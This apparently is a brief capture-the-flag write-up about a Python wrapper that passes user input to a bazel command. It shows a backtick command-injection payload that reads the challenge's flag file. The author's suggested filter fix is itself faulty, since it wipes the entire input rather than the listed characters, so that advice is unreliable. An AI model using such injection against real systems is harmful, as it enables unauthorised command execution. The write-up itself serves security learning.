---
created: 2024-07-21T03:54
updated: 2024-07-21T16:08
solves: 18
points: 474
---

So we have a python file that opens a testing suite...

```python
from subprocess import Popen

name = input('Enter name: ')

for c in '`$(){}':
    name.replace(name, '')

Popen([
    'bazel',
    'run',
    ':run',
    f'--action_env=NAME={name}'
], shell=False).communicate()
```

Wait a minute, nothing is actually being replaced here.

For it to be effective at removing characters it has to be like this.

```python
for c in '`$(){}':
    name = name.replace(name, '')
```

I guess the authors messed up?

```shell
$ nc zable.chal.imaginaryctf.org 1337
Enter name: `cat /app/flag.txt`
Hello, ictf{I_supp0se_if_a_hacker_can_run_bazel_on_your_system_things_are_already_bad}!
```
